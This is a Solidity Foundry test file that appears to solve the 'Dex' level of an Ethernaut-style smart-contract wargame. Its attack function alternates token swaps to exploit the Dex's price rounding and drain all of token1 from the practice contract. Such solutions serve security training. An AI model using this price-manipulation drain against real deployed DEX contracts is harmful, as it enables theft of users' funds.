// SPDX-License-Identifier: Unlicense
pragma solidity =0.8.23;

import {Tests} from "@core/Tests.sol";
import {DexFactory, Dex, IERC20} from "../levels/22_Dex/DexFactory.sol";

contract TestDex is Tests {
    Dex private level;

    IERC20 private token1;
    IERC20 private token2;

    /* =============================== SETUP&ATTACK =============================== */

    constructor() {
        levelFactory = new DexFactory();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance());
        level = Dex(levelAddress);

        token1 = IERC20(level.token1());
        token2 = IERC20(level.token2());
        assertTrue(token1.balanceOf(levelAddress) == 100 && token2.balanceOf(levelAddress) == 100);
        assertTrue(token1.balanceOf(PLAYER) == 10 && token2.balanceOf(PLAYER) == 10);
    }

    function attack() internal override {
        vm.startPrank(PLAYER);

        token1.approve(address(level), UINT256_MAX);
        token2.approve(address(level), UINT256_MAX);

        swapMax(token1, token2);
        swapMax(token2, token1);
        swapMax(token1, token2);
        swapMax(token2, token1);
        swapMax(token1, token2);
        level.swap(address(token2), address(token1), 45); // Based on calculations in order to drain the `token1`
        assertTrue(token1.balanceOf(address(level)) == 0);

        vm.stopPrank();
    }

    function swapMax(IERC20 tokenIn, IERC20 tokenOut) private {
        level.swap(address(tokenIn), address(tokenOut), tokenIn.balanceOf(PLAYER));
    }

    /* =============================== TEST LEVEL =============================== */

    function testLevel() external {
        runLevel();
    }
}
